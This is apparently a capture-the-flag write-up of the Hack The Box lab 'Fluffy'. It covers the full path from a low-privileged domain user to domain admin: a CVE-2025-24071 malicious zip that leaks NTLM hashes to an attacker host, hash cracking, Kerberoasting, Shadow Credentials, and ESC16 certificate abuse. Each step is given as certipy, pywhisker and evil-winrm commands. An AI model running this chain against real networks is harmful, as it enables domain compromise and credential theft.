---
title: "From normal user to domain admin with exploiting Kerberos and ESC16"
date: 2026-11-02 00:00:00 +0800
categories: [CTF, hacking]
tags: [CTF, HTB, Hacking]
---


# Fluffy - Writeup

**Target:** 10.129.232.88
**Domain:** fluffy.htb
**DC:** DC01


## Recon
As always, i start our target scan with rustscan
```
rustscan -a 10.129.232.88 --ulimit 5000
```

Open ports: 53, 88, 139, 389, 445, 464, 593, 636, 9389, dynamic RPC.

Just afterwards, i hand every discovered port to our friend nmap
```
nmap -sT -A -Pn -T5 -p 53,88,139,389,445,464,593,636,9389,49668,49693,49694,49700,49713,49726,49760 10.129.232.88
```
```

 

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
|_vmware-version: ERROR: Script execution failed (use -d to debug)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-30 02:54:57Z)
|_vmware-version: ERROR: Script execution failed (use -d to debug)
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
|_vmware-version: ERROR: Script execution failed (use -d to debug)
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_vmware-version: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2026-10-30T02:56:06+00:00; +6h00m04s from scanner time.
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
445/tcp   open  microsoft-ds?
|_vmware-version: ERROR: Script execution failed (use -d to debug)
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
|_rpc-grind: ERROR: Script execution failed (use -d to debug)
464/tcp   open  kpasswd5?
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
|_vmware-version: ERROR: Script execution failed (use -d to debug)
|_rpc-grind: ERROR: Script execution failed (use -d to debug)
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
|_vmware-version: ERROR: Script execution failed (use -d to debug)
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_vmware-version: ERROR: Script execution failed (use -d to debug)
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
|_ssl-date: 2026-10-30T02:56:07+00:00; +6h00m04s from scanner time.
WINrm
9389/tcp  open  mc-nmf        .NET Message Framing
|_vmware-version: ERROR: Script execution failed (use -d to debug)
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
49668/tcp open  msrpc         Microsoft Windows RPC
|_vmware-version: ERROR: Script execution failed (use -d to debug)
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
49693/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
|_vmware-version: ERROR: Script execution failed (use -d to debug)
49694/tcp open  msrpc         Microsoft Windows RPC
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
|_vmware-version: ERROR: Script execution failed (use -d to debug)
49700/tcp open  msrpc         Microsoft Windows RPC
|_vmware-version: ERROR: Script execution failed (use -d to debug)
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
49713/tcp open  msrpc         Microsoft Windows RPC
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
|_vmware-version: ERROR: Script execution failed (use -d to debug)
49726/tcp open  msrpc         Microsoft Windows RPC
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
|_vmware-version: ERROR: Script execution failed (use -d to debug)
49760/tcp open  msrpc         Microsoft Windows RPC
|_vmware-version: ERROR: Script execution failed (use -d to debug)
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-10-30T02:55:49
|_  start_date: N/A
|_clock-skew: mean: 6h00m03s, deviation: 0s, median: 6h00m03s
| smb2-security-mode: axfr
|   3.1.1: 
|_    Message signing enabled and required
```

AD domain confirmed: `fluffy.htb`, DC `DC01`.

## Initial access

Provided credentials: `j.fleischman / J0elTHEM4n1990!`

```
nxc smb 10.129.232.88 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
```

Available shares: `IT` (READ,WRITE), `NETLOGON`, `SYSVOL`.

we use the spider_plus module on netexec to download every sharable folder
```
nxc smb 10.129.232.88 -u 'j.fleischman' -p 'J0elTHEM4n1990!' -M spider_plus -o DOWNLOAD_FLAG=True
```

Found a KeePass 2.58 install on the `IT` share, which is vulnerable to CVE-2023-24055, 
```xml
❯ cat KeePass.exe.config
<?xml version="1.0" encoding="utf-8" ?>
<configuration>
	<startup useLegacyV2RuntimeActivationPolicy="true">
		<supportedRuntime version="v4.0" />
		<supportedRuntime version="v2.0.50727" />
	</startup>
	<runtime>
		<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
			<dependentAssembly>
				<assemblyIdentity name="KeePass"
					publicKeyToken="fed2ed7716aecf5c"
					culture="neutral" />
				<bindingRedirect oldVersion="2.0.9.0-2.57.127.127"
					newVersion="2.58.0.0" />
			</dependentAssembly>
		</assemblyBinding>
		<enforceFIPSPolicy enabled="false" />
		<loadFromRemoteSources enabled="true" />
	</runtime>
	<appSettings>
		<add key="EnableWindowsFormsHighDpiAutoResizing" value="true" />
	</appSettings>
</configuration>
```

eventually i found out it is a rabbit hole.


I used netexec to enumerate every user using --users flag, cleared the output and attempted an AS-REP roasting attack:

```bash
❯ GetNPUsers.py fluffy.htb/j.fleischman0:'J0elTHEM4n1990!' -usersfile clear_users.txt  -dc-ip 10.129.232.88
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User ca_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ldap_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User p.agila doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User winrm_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.coffey doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.fleischman doesn't have UF_DONT_REQUIRE_PREAUTH
```
Not the right road, let's move forward.

After carefully inspecting the available shares, we found a pdf inside one of those folder, which was a vulnerability assessment scan made from some of the internal analyst,
exposing the host was vulnerable to (CVE-2025-24071)[https://nvd.nist.gov/vuln/detail/CVE-2025-24071]
<img width="497" height="327" alt="image" src="https://github.com/user-attachments/assets/a4ce4269-5245-4c16-9834-4bc6e0770d24" />

## CVE-2025-24071 - NTLM leak via file explorer
(Link to the exploit)[https://github.com/ThemeHackers/CVE-2025-24071/blob/main/exploit.py]

After uploaded a malicious zip that forces SMB authentication to a controlled host when extracted.
```
python3 exploit.py -f evil.zip --ip-address 10.10.14.170
```

we used responder and captured the NTLMv2-SSP hash for user `p.agila`:

```
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash : <REDACTED>
```

Cracked with hashcat (mode 5600):

```
hashcat -a 0 -m 5600 hash.txt rockyou.txt
```

Password found: `prometheuXXXXXX`

## LDAP enumeration via Kerberos

NTLM auth on LDAP failed. I fixed using a Kerberos ticket instead:

```
kinit p.agila@FLUFFY.HTB
```

Domain enumeration:

```
rusthound --domain fluffy.htb -f dc01.fluffy.htb -i 10.129.232.88 -k
```


From BloodHound: `p.agila` has rights to add itself to the `SERVICE ACCOUNTS` group.

<img width="917" height="206" alt="image" src="https://github.com/user-attachments/assets/be9135a5-21a9-4437-bab5-cae903efedff" />

Exploiting..
```
net rpc group addmem "SERVICE ACCOUNTS" "P.AGILA" -U "FLUFFY.HTB"/"p.agila"%"prometheusx-303" -S "dc01.fluffy.htb"
```

<img width="880" height="440" alt="image" src="https://github.com/user-attachments/assets/07fa4d26-e5fc-4808-874c-cfb8deddbd1f" />
The service account was a group that had generic write access to 3 users, we targetted the winrm_svc account to get access via WINRM.

Therefore, we were able to do some kerberoasting

## Targeted Kerberoasting

```
targetedKerberoast.py -v -d 'fluffy.htb' -u 'p.agila' -p 'prometheusx-303'
```

Got a TGS for `winrm_svc`. Hashcat cracking (mode 13100) against rockyou failed, leading to the Shadow Credentials pivot instead.

## Shadow Credentials on winrm_svc

`p.agila` is in a group with GenericWrite over `winrm_svc`.

we used pywhisker to generate a pfx certificate and be able to requuest a TGT.
```
pywhisker.py -d "fluffy.htb" -u "p.agila" -p "prometheuXXXX" --target "winrm_svc" --action "add"
```

Generated a PFX certificate. We requested a TGT via PKINIT:

```
gettgtpkinit.py -cert-pfx "cert.pfx" -pfx-pass "<PFX_PASS>" -dc-ip 10.129.232.88 "fluffy.htb/winrm_svc" "winrm_svc.ccache"
```

Recovered the NT hash from the AS-REP key:

```
export KRB5CCNAME=winrm_svc.ccache
getnthash.py -key "<AS_REP_KEY found  using pywisker>" -dc-ip 10.129.232.88 "fluffy.htb/winrm_svc"
```

NT hash of `winrm_svc` obtained .

```
evil-winrm -i dc01.fluffy.htb -u winrm_svc -H "<REDACTED>"
```

Shell access as `winrm_svc`.

Enumerating with bloodhound, we found out this:

<img width="1788" height="838" alt="image" src="https://github.com/user-attachments/assets/95318483-1ced-49de-bd79-38dbe8d60188" />

## Shadow Credentials on ca_svc

`winrm_svc` has GenericWrite over `ca_svc` (the CA service account).

```
pywhisker.py -d "fluffy.htb" -u "winrm_svc" -H "<REDACTED>" --target "ca_svc" --action "add"
```

Same chain: PKINIT, then recover the NT hash of `ca_svc`:

```
gettgtpkinit.py -cert-pfx "cert.pfx" -pfx-pass "<PFX_PASS>" -dc-ip fluffy.htb "fluffy.htb/ca_svc" "ca_svc.ccache"
export KRB5CCNAME=ca_svc.ccache
getnthash.py -key "<AS_REP_KEY>" -dc-ip 10.129.93.244 "fluffy.htb/ca_svc"
```

NT hash of `ca_svc` obtained.

## ADCS - ESC16

```
certipy find -vulnerable -u 'ca_svc@fluffy.htb' -hashes '<REDACTED>' -dc-ip 10.129.93.244
```

CA `fluffy-DC01-CA` is vulnerable to ESC16 (security extension disabled, `Disabled Extensions: 1.3.6.1.4.1.311.25.2`). `ca_svc` has enrollment rights through the `Cert Publishers` group.

### Exploit

Temporarily change the UPN of `ca_svc` to the target's:

```
certipy account update -u 'ca_svc@fluffy.htb' -hashes '<REDACTED>' -dc-ip 10.129.93.244 -user 'ca_svc' -upn 'administrator@fluffy.htb'
```

Request a certificate with the `User` template:

```
certipy req -u 'ca_svc@fluffy.htb' -hashes '<REDACTED>' -dc-ip 10.129.93.244 -target dc01.fluffy.htb -ca fluffy-DC01-CA -template User
```

Certificate obtained with SAN UPN `administrator@fluffy.htb`.

Restore the original UPN of `ca_svc`:

```
certipy account update -u 'ca_svc@fluffy.htb' -hashes '<REDACTED>' -dc-ip 10.129.93.244 -user 'ca_svc' -upn 'ca_svc@fluffy.htb'
```

Authenticate with the certificate:

```
certipy auth -pfx administrator.pfx -dc-ip 10.129.93.244 -domain fluffy.htb
```

TGT and NT hash of `administrator` obtained.

## Domain Admin

```
evil-winrm -i dc01.fluffy.htb -u administrator -H "<REDACTED>"
```

Access as Administrator.

## Chain summary

1. SMB write on IT share, CVE-2025-24071 to leak `p.agila` NTLMv2 hash
2. Crack hash, LDAP access via Kerberos
3. Abuse group membership permission into `SERVICE ACCOUNTS`
4. Shadow Credentials: `p.agila` -> `winrm_svc` -> `ca_svc`
5. ESC16 on `fluffy-DC01-CA`: UPN spoofing toward `administrator`
6. Administrator NT hash, Domain Admin
